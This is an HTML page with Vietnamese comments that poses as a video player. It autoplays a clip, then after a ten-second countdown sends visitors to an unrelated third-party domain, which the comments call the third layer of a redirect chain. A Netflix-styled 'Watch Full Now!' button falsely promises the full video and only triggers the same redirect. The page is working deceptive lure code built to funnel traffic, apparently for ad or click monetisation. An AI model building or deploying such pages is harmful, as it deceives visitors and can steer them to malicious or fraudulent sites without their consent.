<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Video</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        html, body {
            height: 100%;
            background: #000;
            overflow: hidden;
        }
        #container {
            position: relative;
            width: 100%;
            height: 100%;
        }
        video {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }
        #overlay {
            position: absolute;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.85);
            display: none;
            align-items: center;
            justify-content: center;
            color: #fff;
            font-family: system-ui, -apple-system, sans-serif;
            font-size: 18px;
            flex-direction: column;
            z-index: 10;
        }
        #overlay span {
            margin-top: 12px;
            font-size: 15px;
            opacity: 0.85;
        }

        /* NÚT "Watch Full Now!" */
        #skipButton {
            position: absolute;
            bottom: 25px;
            right: 25px;
            background: #e50914; /* màu đỏ Netflix-style */
            color: #fff;
            border: none;
            padding: 14px 24px;
            font-size: 17px;
            font-weight: 700;
            border-radius: 4px;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(229, 9, 20, 0.4);
            z-index: 20;
            transition: all 0.2s ease;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        #skipButton:hover {
            background: #f40612;
            transform: scale(1.05);
            box-shadow: 0 6px 20px rgba(229, 9, 20, 0.6);
        }
    </style>
</head>
<body>
    <div id="container">
        <!-- Video Tầng 2 (tự động phát) -->
        <video id="player" controls autoplay playsinline muted></video>
        
        <!-- Nút Watch Full Now! -->
        <button id="skipButton">Watch Full Now!</button>
        
        <!-- Overlay thông báo redirect -->
        <div id="overlay">
            <div>Đang chuyển hướng...</div>
            <span>Chờ 10 giây</span>
        </div>
    </div>

    <script>
        // ====================== CẤU HÌNH ======================
        const VIDEO_BASE   = "http://cdn.videy.co";   // Tầng 2 – video sẽ phát
        const REDIRECT_URL = "https://broadlyjukeboxunrevised.com/2053781"; // Tầng 3 – link redirect
        const DELAY_MS     = 10000;                  // 10 giây
        // =====================================================

        function getFilename() {
            let path = window.location.pathname;
            let filename = path.split('/').pop();
            
            if (!filename || (!filename.endsWith('.mp4') && !filename.endsWith('.mov'))) {
                filename = '0437be931.mp4'; // fallback
            }
            return filename;
        }

        function init() {
            const filename = getFilename();
            const videoUrl = `${VIDEO_BASE}/${filename}`;

            console.log(`🎥 Đang phát video Tầng 2: ${videoUrl}`);
            console.log(`⏰ Sau 10 giây sẽ redirect sang Tầng 3: ${REDIRECT_URL}`);

            // Load video và tự động phát
            const video = document.getElementById('player');
            video.src = videoUrl;
            video.play().catch(err => console.log('Auto-play bị chặn:', err));

            // Nút "Watch Full Now!" – click thì redirect ngay
            const skipButton = document.getElementById('skipButton');
            skipButton.addEventListener('click', () => {
                console.log('👆 Người dùng click "Watch Full Now!" → redirect ngay');
                window.location.href = REDIRECT_URL;
            });

            // Countdown + overlay (vẫn giữ redirect tự động sau 10s)
            const overlay = document.getElementById('overlay');
            const countdownEl = overlay.querySelector('span');
            let secondsLeft = 10;

            const countdownInterval = setInterval(() => {
                secondsLeft--;
                countdownEl.textContent = `Chờ ${secondsLeft} giây`;
                if (secondsLeft <= 0) clearInterval(countdownInterval);
            }, 1000);

            // Redirect tự động sau 10 giây
            setTimeout(() => {
                clearInterval(countdownInterval);
                overlay.style.display = 'flex';
                window.location.href = REDIRECT_URL;
            }, DELAY_MS);
        }

        window.onload = init;
    </script>
</body>
</html>
